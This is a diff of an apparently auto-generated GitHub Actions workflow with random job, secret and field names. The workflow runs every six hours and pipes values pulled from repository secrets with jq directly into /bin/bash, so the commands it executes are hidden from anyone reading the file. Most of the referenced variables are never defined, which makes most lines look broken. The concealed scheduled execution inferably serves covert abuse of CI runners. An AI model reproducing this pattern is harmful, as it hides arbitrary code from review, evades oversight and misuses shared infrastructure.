@@ -1,25 +1,31 @@
 name: hehuchong1391
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '34 5/6 * * *'
+    - cron: '17 5/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: hehuchong1391
         env:
-          pzn99: ${{ secrets.pzn99 }}
+          djt3: ${{ secrets.djt3 }}
         run: |
-          echo $pzn99 | jq -r .xybc82070 | /bin/bash
-          echo $nryx94536 | jq -r .i54 | /bin/bash
-          echo $mpoad1 | jq -r .kv91989 | /bin/bash
-          echo $rf52736 | jq -r .gpb8 | /bin/bash
-          echo $j73 | jq -r .ekdg2 | /bin/bash
-          echo $q7020 | jq -r .l8 | /bin/bash
-          echo $pbw2 | jq -r .oys85068 | /bin/bash
-          echo $sy79377 | jq -r .tbxp7928 | /bin/bash
-          echo $kh4795 | jq -r .snly286 | /bin/bash
-          echo $av6 | jq -r .ug05752 | /bin/bash
+          echo $djt3 | jq -r .f0778 | /bin/bash
+          echo $xczj414 | jq -r .f440 | /bin/bash
+          echo $jyyct6652 | jq -r .rzvdv76 | /bin/bash
+          echo $i3873 | jq -r .tkdzq95388 | /bin/bash
+          echo $tr7 | jq -r .eibr37873 | /bin/bash
+          echo $kq6 | jq -r .m72211 | /bin/bash
+          echo $cmr37 | jq -r .pg41 | /bin/bash
+          echo $yvsn71482 | jq -r .vjsmx91471 | /bin/bash
+          echo $nj9364 | jq -r .tyttw574 | /bin/bash
+          echo $om7505 | jq -r .ziwjo3 | /bin/bash
+          echo $ymn65 | jq -r .h458 | /bin/bash
+          echo $nzvm1431 | jq -r .d157 | /bin/bash
+          echo $xp0096 | jq -r .ikqk6 | /bin/bash
 
